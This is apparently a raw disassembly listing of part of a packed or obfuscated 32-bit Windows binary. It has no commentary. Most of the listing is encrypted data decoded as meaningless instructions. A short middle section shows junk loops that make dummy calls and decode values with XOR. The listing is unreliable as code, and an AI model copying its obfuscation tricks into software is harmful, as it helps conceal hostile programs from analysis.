  40a63a:	mov    ebp,0x7eafc22
  40a63f:	icebp  
  40a640:	and    BYTE PTR [ebp+edi*2-0x77],al
  40a644:	sbb    DWORD PTR [esi],esp
  40a646:	scas   eax,DWORD PTR es:[edi]
  40a647:	cmp    ebp,DWORD PTR [ebx+0x4aa73438]
  40a64d:	sbb    DWORD PTR [edi-0x3e],ebx
  40a650:	sbb    ah,bh
  40a652:	cmp    dh,al
  40a654:	out    0x98,al
  40a656:	xchg   BYTE PTR [esi+esi*4],bl
  40a659:	ss xchg ebp,eax
  40a65b:	and    DWORD PTR [edx-0x35],0x13
  40a65f:	sub    BYTE PTR [esp+ebx*2+0x551bb8d5],dl
  40a666:	outs   dx,DWORD PTR ds:[esi]
  40a667:	push   ss
  40a668:	loop   0x40a67c
  40a66a:	cmp    eax,0x2511a5dc
  40a66f:	(bad)  
  40a670:	loopne 0x40a669
  40a672:	add    ebx,ebx
  40a674:	mov    DWORD PTR [esi],eax
  40a676:	push   es
  40a677:	jg     0x40a65e
  40a679:	sub    eax,DWORD PTR ds:[ebx]
  40a67c:	push   esi
  40a67d:	pop    ecx
  40a67e:	jg     0x40a632
  40a680:	js     0x40a69c
  40a682:	test   BYTE PTR [eax+esi*8-0x1a26797c],0x7
  40a68a:	(bad)  
  40a68b:	out    dx,al
  40a68c:	xchg   esi,eax
  40a68d:	les    eax,FWORD PTR [ebp+0x3c]
  40a690:	xchg   DWORD PTR [edi-0x5d],esp
  40a693:	pop    edi
  40a694:	push   eax
  40a695:	in     al,dx
  40a696:	ss out 0xd8,al
  40a699:	loopne 0x40a638
  40a69b:	(bad)  
  40a69c:	mov    bl,0xf0
  40a69e:	retf   
  40a69f:	fwait
  40a6a0:	lahf   
  40a6a1:	mov    ecx,0x368e5ab5
  40a6a6:	cs ds pushf 
  40a6a9:	les    ebx,FWORD PTR ds:0x74ec2437
  40a6af:	scas   al,BYTE PTR es:[edi]
  40a6b0:	xchg   edx,eax
  40a6b1:	shl    BYTE PTR [ebx-0x8773feb],1
  40a6b7:	xchg   ebp,eax
  40a6b8:	push   edx
  40a6b9:	xchg   BYTE PTR ds:0x12a5f6fd,ah
  40a6bf:	dec    ebp
  40a6c0:	inc    esp
  40a6c1:	repnz sbb DWORD PTR [ecx+0x351192d7],0xba569b5f
  40a6cc:	inc    esp
  40a6cd:	inc    edi
  40a6ce:	cdq    
  40a6cf:	stc    
  40a6d0:	fiadd  DWORD PTR [ecx+0xf]
  40a6d3:	int    0x84
  40a6d5:	pop    DWORD PTR [edi]
  40a6d7:	fcom   QWORD PTR [esi+eax*2-0x2e4d1af5]
  40a6de:	add    eax,0x109d61a4
  40a6e3:	ret    0x85b1
  40a6e6:	inc    esi
  40a6e7:	xor    BYTE PTR [ebp+0x3e59f070],bl
  40a6ed:	fwait
  40a6ee:	scas   al,BYTE PTR es:[edi]
  40a6ef:	jns    0x40a6c9
  40a6f1:	dec    edi
  40a6f2:	fst    DWORD PTR [ebx-0x2d3df12c]
  40a6f8:	pop    ebx
  40a6f9:	inc    edi
  40a6fa:	push   edi
  40a6fb:	(bad)  
  40a6fc:	sub    esp,DWORD PTR [esp+eax*8]
  40a6ff:	call   0x9c72:0xfb24df0b
  40a706:	jmp    0xa81e:0x1bf5f62d
  40a70d:	ret    
  40a70e:	xlat   BYTE PTR ds:[ebx]
  40a70f:	or     BYTE PTR [edx+0x44aefaed],0xc2
  40a716:	ins    BYTE PTR es:[edi],dx
  40a717:	(bad)  
  40a718:	mul    DWORD PTR [ebx+ebx*4]
  40a71b:	out    dx,eax
  40a71c:	outs   dx,DWORD PTR ds:[esi]
  40a71d:	lea    ecx,[ebx+0x5ff82866]
  40a723:	pop    ss
  40a724:	call   0xa947:0xfeb13510
  40a72b:	pop    ebx
  40a72c:	sbb    ch,BYTE PTR [eax+edx*1+0x50f7127f]
  40a733:	cld    
  40a734:	das    
  40a735:	push   0xbc4773a7
  40a73a:	arpl   WORD PTR [eax],dx
  40a73c:	outs   dx,BYTE PTR ds:[esi]
  40a73d:	adc    eax,0xb79990dc
  40a742:	inc    edx
  40a743:	in     al,dx
  40a744:	add    DWORD PTR [edi],esi
  40a746:	mov    edi,0x2d9f749d
  40a74b:	neg    DWORD PTR ss:[eax-0x41]
  40a74f:	xchg   esi,eax
  40a750:	push   edi
  40a751:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40a753:	ss mov edi,0xd69d2a87
  40a759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a75a:	xchg   esp,eax
  40a75b:	(bad)  
  40a75c:	xor    eax,0x67b105f6
  40a761:	fucom  st(4)
  40a763:	and    ecx,esp
  40a765:	adc    eax,0x367b7d9d
  40a76a:	aaa    
  40a76b:	(bad)  
  40a76c:	jmp    0xc277c928
  40a771:	in     eax,0xae
  40a773:	add    dl,bl
  40a775:	or     eax,0x96727c87
  40a77a:	stc    
  40a77b:	je     0x40a778
  40a77d:	jg     0x40a7b2
  40a77f:	cmp    dl,ah
  40a781:	or     eax,0xb0798b38
  40a786:	ins    BYTE PTR es:[edi],dx
  40a787:	imul   ecx,DWORD PTR [ecx+0x7b],0xe9573b01
  40a78e:	mov    bl,0x1
  40a790:	add    BYTE PTR [eax],al
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2+0x1b]
  40a79f:	mov    esi,0xef77c275
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a812
  40a7ab:	das    
  40a7ac:	sub    ecx,esi
  40a7ae:	add    dh,dh
  40a7b0:	mov    bl,0xee
  40a7b2:	std    
  40a7b3:	dec    ebx
  40a7b4:	xchg   esp,eax
  40a7b5:	fnsave [edi+eax*1+0x20]
  40a7b9:	cs dec esp
  40a7bb:	jmp    0x40a817
  40a7bd:	jnp    0x40a77d
  40a7bf:	data16 clc 
  40a7c1:	jns    0x40a7c1
  40a7c3:	imul   edi,DWORD PTR [ecx+eiz*1],0x13
  40a7c7:	sbb    BYTE PTR [ecx+ebp*2+0x41f20a77],bh
  40a7ce:	data16 outs dx,BYTE PTR ds:[esi]
  40a7d0:	mov    ah,0xc5
  40a7d2:	pushf  
  40a7d3:	sub    bh,bl
  40a7d5:	out    dx,eax
  40a7d6:	icebp  
  40a7d7:	fxch   st(6)
  40a7d9:	cmp    DWORD PTR [esi],edx
  40a7db:	es pop ds
  40a7dd:	jae    0x40a7a9
  40a7df:	cmp    DWORD PTR [edi+0x4ae870d6],ecx
  40a7e5:	(bad)  
  40a7e6:	pop    edi
  40a7e7:	out    0x72,al
  40a7e9:	enter  0xe32d,0xe0
  40a7ed:	mov    ch,0xa3
  40a7ef:	jb     0x40a81c
  40a7f1:	ss jo  0x40a86d
  40a7f4:	or     BYTE PTR [eax],bl
  40a7f6:	add    cl,ah
  40a7f8:	call   0x507a:0x32016b46
  40a7ff:	sbb    ah,BYTE PTR [ecx]
  40a801:	or     edi,edx
  40a803:	xchg   edx,eax
  40a804:	inc    ecx
  40a805:	xchg   esp,eax
  40a806:	call   0xeb92a9d2
  40a80b:	mov    bh,0x25
  40a80d:	outs   dx,BYTE PTR ds:[esi]
  40a80e:	minps  xmm5,XMMWORD PTR [edi]
  40a811:	cmp    eax,0x5b1938b1
  40a816:	mov    WORD PTR ds:0xe920fb91,gs
  40a81c:	stc    
  40a81d:	fnstsw WORD PTR [edx-0x2d]
  40a820:	push   0x1
  40a822:	ds dec ebp
  40a824:	adc    edi,DWORD PTR [edi]
  40a826:	pop    esp
  40a827:	idiv   DWORD PTR [ecx+ecx*4+0x6b1cb03f]
  40a82e:	psubusb mm1,QWORD PTR ds:0x82bc20f3
  40a835:	test   eax,0x334863d6
  40a83a:	mov    ah,0x2b
  40a83c:	aaa    
  40a83d:	sub    al,0xf8
  40a83f:	(bad)  
  40a840:	cld    
  40a841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a842:	inc    esi
  40a843:	fwait
  40a844:	lock add esp,edx
  40a847:	aaa    
  40a848:	cmp    bl,BYTE PTR [ecx-0x1e]
  40a84b:	fdivrp st(4),st
  40a84d:	popf   
  40a84e:	mov    ebx,0xb053a82d
  40a853:	xchg   ecx,eax
  40a854:	scas   al,BYTE PTR es:[edi]
  40a855:	lods   eax,DWORD PTR ds:[esi]
  40a856:	into   
  40a857:	call   0xfc51:0x7826b912
  40a85e:	test   eax,0xae56ae94
  40a863:	stos   BYTE PTR es:[edi],al
  40a864:	fdiv   QWORD PTR [ebx+0x54bcaac8]
  40a86a:	dec    eax
  40a86b:	popf   
  40a86c:	pop    edx
  40a86d:	data16 repz das 
  40a870:	in     al,0xf1
  40a872:	dec    edx
  40a873:	dec    eax
  40a874:	ss in  eax,0xce
  40a877:	in     eax,dx
  40a878:	add    eax,0xf02882c3
  40a87d:	popa   
  40a87e:	jge    0x40a880
  40a880:	dec    ecx
  40a881:	jmp    0x2efd4694
  40a886:	mov    ?,WORD PTR [eax-0x4c]
  40a889:	fs cli 
  40a88b:	mov    dh,0x9c
  40a88d:	pushf  
  40a88e:	cmp    DWORD PTR [edi],ecx
  40a890:	and    BYTE PTR [ecx+0x16],dh
  40a893:	xlat   BYTE PTR ds:[ebx]
  40a894:	push   ss
  40a895:	loopne 0x40a900
  40a897:	push   es
  40a898:	rcr    BYTE PTR [ebp-0x13],1
  40a89b:	in     al,0x25
  40a89d:	out    0x4,eax
  40a89f:	pop    ecx
  40a8a0:	adc    DWORD PTR [ebp+0x71],ecx
  40a8a3:	jno    0x40a8d1
  40a8a5:	out    dx,eax
  40a8a6:	push   0xb1cc96d7
  40a8ab:	adc    BYTE PTR [eax],al
  40a8ad:	xchg   DWORD PTR [ecx+ebx*1+0x50],esi
  40a8b1:	nop
  40a8b2:	into   
  40a8b3:	or     edi,DWORD PTR [esi-0x7038ea84]
  40a8b9:	retf   0xbb1f
  40a8bc:	mov    eax,ds:0xb7924440
  40a8c1:	lahf   
  40a8c2:	pop    esi
  40a8c3:	test   eax,0xdbc28110
  40a8c8:	fcomp  QWORD PTR [esi-0x2edb4abb]
  40a8ce:	or     eax,0xd48c1c59
  40a8d3:	and    al,BYTE PTR [ecx-0x477e858]
  40a8d9:	mov    dl,0xf9
  40a8db:	sub    DWORD PTR [edi-0x55],eax
  40a8de:	pop    es
  40a8df:	jp     0x40a8ce
  40a8e1:	int    0xa7
  40a8e3:	mov    dh,0x95
  40a8e5:	sub    BYTE PTR [ebp+0x34],al
  40a8e8:	sti    
  40a8e9:	mov    BYTE PTR [ebx],0x86
  40a8ec:	jno    0x40a8d7
  40a8ee:	(bad)  
  40a8ef:	xchg   edi,eax
  40a8f0:	lock test DWORD PTR [ecx+0x4da3189e],esp
  40a8f7:	sbb    eax,0x81f9b153
  40a8fc:	das    
  40a8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8fe:	data16 xor al,0xb6
  40a901:	add    dl,BYTE PTR [ebp+0x14589d0e]
  40a907:	out    0xad,eax
  40a909:	cmp    ah,BYTE PTR [ebx+0x1a7a5bb6]
  40a90f:	mov    edi,0x3a83bceb
  40a914:	lods   eax,DWORD PTR ds:[esi]
  40a915:	or     bh,BYTE PTR [eax]
  40a917:	mov    ecx,0xca62ecd3
  40a91c:	gs sub al,0x11
  40a91f:	es test al,0xf0
  40a922:	mov    WORD PTR [edx+esi*8-0x4e],cs
  40a926:	xor    DWORD PTR [ebp-0x5f6cf26e],0xf49f8586
  40a930:	mov    ch,al
  40a932:	xchg   ecx,eax
  40a933:	adc    esp,DWORD PTR [esi-0x772e4924]
  40a939:	jmp    0xc1cda788
  40a93e:	jne    0x40a9a0
  40a940:	pop    edi
  40a941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a942:	fistp  WORD PTR [edi-0x56]
  40a945:	mov    edi,0x32729c
  40a94a:	adc    ebx,DWORD PTR ds:0x432708
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432de2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434421
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432de2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432dca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4326fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4326fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4326fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4326fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4326fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d12
  40a9bb:	cmp    DWORD PTR ds:0x4326fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4326fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4326fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4326f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4326f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4326f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4326f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432c62
  40aa39:	cmp    DWORD PTR ds:0x4326f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4326f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434376,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43437e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43437e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43437e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43437e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43437e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43275d
  40aaa8:	call   DWORD PTR ds:0x432d16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43436e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4343a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432dc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434392
  40aae3:	sbb    DWORD PTR ds:0x4326ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434419,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432de2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434392,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x127cbad5
  40ab36:	inc    ebp
  40ab37:	fcom   DWORD PTR [esi+0x7070ed8c]
  40ab3d:	xchg   ebp,eax
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40abb0
  40ab42:	dec    BYTE PTR [edx-0xd]
  40ab45:	or     DWORD PTR [edx-0x6e8cc873],ebx
  40ab4b:	push   ebx
  40ab4c:	mov    ds:0x21eb05b9,al
  40ab51:	scas   eax,DWORD PTR es:[edi]
  40ab52:	add    esi,ecx
  40ab54:	sbb    ebx,DWORD PTR [eax-0x39add137]
  40ab5a:	in     al,dx
  40ab5b:	idiv   BYTE PTR fs:[edx-0xdc07e69]
  40ab62:	fst    QWORD PTR [ecx]
  40ab64:	jno    0x40abcc
  40ab66:	jns    0x40ab7e
  40ab68:	jne    0x40ab1a
  40ab6a:	ss repz inc esi
  40ab6d:	pop    ebx
  40ab6e:	jno    0x40abc4
  40ab70:	sub    DWORD PTR [ecx+0x64],0xffffffe9
  40ab74:	stc    
  40ab75:	or     dl,0x4f
  40ab78:	push   es
  40ab79:	jp     0x40ab62
  40ab7b:	mov    al,0xe
  40ab7d:	mov    ch,0x58
  40ab7f:	adc    eax,0x50974d8b
  40ab84:	push   es
  40ab85:	fsubr  DWORD PTR [ebp+0x62d6e343]
  40ab8b:	ss mov dh,0x79
  40ab8e:	pop    ds
  40ab8f:	(bad)  
  40ab90:	adc    eax,0x766230ec
  40ab95:	and    dl,BYTE PTR [esi-0x51ba2ee]
  40ab9b:	push   cs
  40ab9c:	xlat   BYTE PTR ds:[ebx]
  40ab9d:	scas   al,BYTE PTR es:[edi]
  40ab9e:	enter  0x9154,0x21
  40aba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aba3:	rcr    DWORD PTR [esi-0x183c716a],0x16
  40abaa:	cmp    esp,edi
  40abac:	xor    al,0x14
  40abae:	out    0x42,al
  40abb0:	lds    esp,FWORD PTR [edi-0x219dce69]
  40abb6:	xchg   BYTE PTR [eax+ecx*8],ch
  40abb9:	(bad)  
  40abba:	retf   0x6695
  40abbd:	jmp    0xd711:0x9807d41c
  40abc4:	scas   al,BYTE PTR es:[edi]
  40abc5:	and    al,0x4a
  40abc7:	int    0xa2
  40abc9:	daa    
  40abca:	je     0x40ab79
  40abcc:	and    DWORD PTR [edi+0x55],edx
  40abcf:	out    0x52,eax
  40abd1:	xchg   ebx,eax
  40abd2:	cmp    eax,edx
  40abd4:	pop    esp
  40abd5:	jmp    0x40abb4
  40abd7:	mov    eax,DWORD PTR [eax+ebp*1+0x1ed09cd8]
  40abde:	loop   0x40ac3d
  40abe0:	jle    0x40ac0a
  40abe2:	ror    DWORD PTR [edi],0xc8
  40abe5:	adc    ch,ah
  40abe7:	pop    ebp
  40abe8:	cmp    ebx,DWORD PTR [eax+0x69]
  40abeb:	test   eax,0xa35e4e1e
  40abf0:	sbb    al,0x5a
  40abf2:	into   
  40abf3:	push   ss
  40abf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abf5:	sbb    DWORD PTR [ebx+0x6e483849],0x52247111
  40abff:	push   0xf
  40ac01:	and    bh,BYTE PTR ds:0xca951f4
  40ac07:	retf   
  40ac08:	cmp    al,0xb0
  40ac0a:	mov    al,ds:0xba6efaea
  40ac0f:	pop    esi
  40ac10:	cmp    DWORD PTR [edi],ebp
  40ac12:	push   ebp
  40ac13:	sbb    al,0xe7
  40ac15:	push   eax
  40ac16:	pop    ebp
  40ac17:	fmul   DWORD PTR ds:0x55fe87d3
  40ac1d:	int    0xcb
  40ac1f:	push   ebp
  40ac20:	sub    BYTE PTR [edi+esi*4-0x12],ah
  40ac24:	xchg   ebx,eax
  40ac25:	int    0xea
  40ac27:	jl     0x40ac07
  40ac29:	outs   dx,BYTE PTR ds:[esi]
  40ac2a:	xor    DWORD PTR [eax],esp
  40ac2c:	pop    ebp
  40ac2d:	and    eax,esi
  40ac2f:	ficomp WORD PTR [ecx+edi*1+0x7]
  40ac33:	jmp    DWORD PTR [ecx+edx*2+0x2e4411d5]
  40ac3a:	and    eax,0x1b14d63d
  40ac3f:	lods   al,BYTE PTR ds:[esi]
  40ac40:	add    al,0x7c
  40ac42:	jne    0x40ac37
  40ac44:	jle    0x40ac7d
  40ac46:	(bad)  
  40ac47:	(bad)  
  40ac48:	call   0xe358:0x898fd63b
  40ac4f:	pop    edx
  40ac50:	int3   
  40ac51:	ins    DWORD PTR es:[edi],dx
  40ac52:	pop    esp
  40ac53:	sub    eax,DWORD PTR ds:0x1f081c89
  40ac59:	out    dx,eax
  40ac5a:	jecxz  0x40acd7
  40ac5c:	addr16 (bad) 
  40ac5e:	fsubr  st(1),st
  40ac60:	adc    DWORD PTR [edi-0x28],esp
  40ac63:	or     BYTE PTR [edi+0x7f],0xe1
  40ac67:	and    al,0xc9
  40ac69:	push   ss
  40ac6a:	dec    ebx
  40ac6b:	stc    
  40ac6c:	and    cl,dh
  40ac6e:	cld    
  40ac6f:	cmp    DWORD PTR [ebp-0xbf5d6a6],ebx
  40ac75:	dec    edx
  40ac76:	fdiv   QWORD PTR [ebx+ecx*2+0x72]
  40ac7a:	(bad)  
  40ac7b:	les    edx,FWORD PTR ds:0xa12df88
  40ac81:	adc    esi,ebx
  40ac83:	pop    ss
  40ac84:	lods   eax,DWORD PTR ds:[esi]
  40ac85:	sbb    al,0x73
  40ac87:	jl     0x40ac3b
  40ac89:	xchg   ecx,eax
  40ac8a:	xor    eax,0x5a7ce3f3
  40ac8f:	loope  0x40acdc
  40ac91:	push   es
  40ac92:	xor    BYTE PTR [esp+edi*8-0x32],dh
  40ac96:	mov    ch,0x4a
  40ac98:	in     eax,dx
  40ac99:	test   al,0x70
  40ac9b:	ja     0x40ac7c
  40ac9d:	imul   DWORD PTR [edx+0x189ef13e]
  40aca3:	daa    
  40aca4:	inc    ebp
  40aca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aca6:	and    eax,0x53f73331
  40acab:	mov    edx,0x79c23053
  40acb0:	inc    ecx
  40acb1:	ret    0x8510
  40acb4:	(bad)  
  40acb6:	jnp    0x40acd3
  40acb8:	mov    esp,0x7bda141d
  40acbd:	pop    esp
  40acbe:	and    al,0xef
  40acc0:	int3   
  40acc1:	pop    edx
  40acc2:	std    
  40acc3:	push   eax
  40acc4:	mov    esp,0x7a040a62
  40acc9:	inc    ebp
  40acca:	ins    BYTE PTR es:[edi],dx
  40accb:	mov    edi,0x9337c1d6
  40acd0:	(bad)  
  40acd1:	das    
  40acd2:	gs push gs
  40acd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acd6:	(bad)  
  40acd7:	jnp    0x40ac84
  40acd9:	and    eax,0x458b5a94
  40acde:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	fild   QWORD PTR [edx+ebx*8-0xc]
  40ad48:	and    ebx,ebp
  40ad4a:	jo     0x40adbc
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40adc5
  40ad51:	jecxz  0x40acd7
  40ad53:	cwde   
  40ad54:	jp     0x40acfc
  40ad56:	adc    eax,edx
  40ad58:	cmp    eax,0x747b95f7
  40ad5d:	icebp  
  40ad5e:	out    0x6f,eax
  40ad60:	adc    eax,0xe8216b50
  40ad65:	mov    al,ds:0x8798818a
  40ad6a:	sti    
  40ad6b:	xor    al,BYTE PTR [ebp-0x166a418]
  40ad71:	mov    edx,0xb6ebe0a2
  40ad76:	cmp    BYTE PTR [edx],al
  40ad78:	popa   
  40ad79:	inc    esi
  40ad7a:	add    esi,DWORD PTR [edi-0x1b]
  40ad7d:	jge    0x40ad66
  40ad7f:	xlat   BYTE PTR ds:[ebx]
  40ad80:	aam    0xb4
  40ad82:	std    
  40ad83:	jle    0x40ad54
  40ad85:	imul   ebx,ebp,0x1d
  40ad88:	out    0x9e,al
  40ad8a:	pop    esp
  40ad8b:	es icebp 
  40ad8d:	mov    bh,0xbb
  40ad8f:	in     eax,0x4d
  40ad91:	jmp    0x40add2
  40ad93:	ret    0x4f23
  40ad96:	iret   
  40ad97:	pop    ss
  40ad98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad99:	in     ax,0x4e
  40ad9c:	stos   BYTE PTR es:[edi],al
  40ad9d:	loopne 0x40adfb
  40ad9f:	fnsave [edx-0x2240b739]
  40ada5:	push   ecx
  40ada6:	not    DWORD PTR [eax-0x493ea7a5]
  40adac:	or     eax,DWORD PTR [edi+0x3c996441]
  40adb2:	inc    ecx
  40adb3:	mov    dh,0x37
  40adb5:	xor    eax,ecx
  40adb7:	jno    0x40ad5d
  40adb9:	xor    eax,0xf0dbb2f8
  40adbe:	and    eax,0x355d2003
  40adc3:	fdiv   QWORD PTR [edi+edx*2+0x7c8c3833]
  40adca:	nop
  40adcb:	mov    ds:0x1802fb7c,eax
  40add0:	dec    ebx
  40add1:	sbb    BYTE PTR ds:0x11d3f5a1,0xe
  40add8:	push   ebx
  40add9:	out    dx,eax
  40adda:	lock jmp 0x9b23:0xaf511ad5
  40ade2:	sub    esp,DWORD PTR [ecx-0xb]
  40ade5:	xor    eax,0x42aca4bc
  40adea:	call   0xee049c8c
  40adef:	push   esi
  40adf0:	in     al,dx
  40adf1:	mov    ds:0x3aa02141,al
  40adf6:	inc    ebx
  40adf7:	and    eax,0xa8985095
  40adfc:	xchg   BYTE PTR [edx],ch
  40adfe:	hlt    
  40adff:	pop    esi
  40ae00:	lds    ebx,FWORD PTR [ebx-0x1e]
  40ae03:	and    al,0xf4
  40ae05:	and    eax,0x5faebf8f
  40ae0a:	ss retf 0xfa8a
  40ae0e:	or     eax,0x7e2d6390
  40ae13:	call   0x4c53:0x4ab1ddc0
  40ae1a:	aaa    
  40ae1b:	dec    esi
  40ae1c:	sti    
  40ae1d:	adc    BYTE PTR [edx],bh
  40ae1f:	mov    eax,0x8058634
  40ae24:	xchg   ebx,eax
  40ae25:	fwait
  40ae26:	iret   
  40ae27:	jns    0x40ae71
  40ae29:	fwait
  40ae2a:	test   BYTE PTR [eax],dl
  40ae2c:	cmp    BYTE PTR [ecx],ah
  40ae2e:	add    eax,0x4c854cc1
  40ae34:	push   es
  40ae35:	sub    BYTE PTR [eax-0x30],dh
  40ae38:	cmp    ah,ah
  40ae3a:	xor    eax,0x4476c6d8
  40ae3f:	out    dx,eax
  40ae40:	push   cs
  40ae41:	sar    DWORD PTR [ecx+0x6e913466],1
  40ae47:	fcom   QWORD PTR [eax+0x72]
  40ae4a:	retf   
  40ae4b:	add    dh,dh
  40ae4d:	shl    BYTE PTR [ecx],1
  40ae4f:	aad    0xfa
  40ae51:	push   0x87cec113
  40ae56:	push   ebp
  40ae57:	jecxz  0x40ae34
  40ae59:	sbb    eax,ebx
  40ae5b:	xor    bl,BYTE PTR fs:[ebp+0x7d7ae9d0]
  40ae62:	inc    eax
  40ae63:	mov    ch,0x2f
  40ae65:	in     eax,dx
  40ae66:	out    dx,eax
  40ae67:	test   DWORD PTR [ecx],ebx
  40ae69:	push   esp
  40ae6a:	sbb    eax,0x42f549e8
  40ae6f:	mov    ah,0xcb
  40ae71:	repnz mov ecx,0x8a119932
  40ae77:	sbb    ecx,DWORD PTR [eax]
  40ae79:	fs xor ah,ch
  40ae7c:	or     DWORD PTR [eax+0x72af644a],0x76b71baf
  40ae86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae87:	idiv   DWORD PTR [eax-0x5c4deb7b]
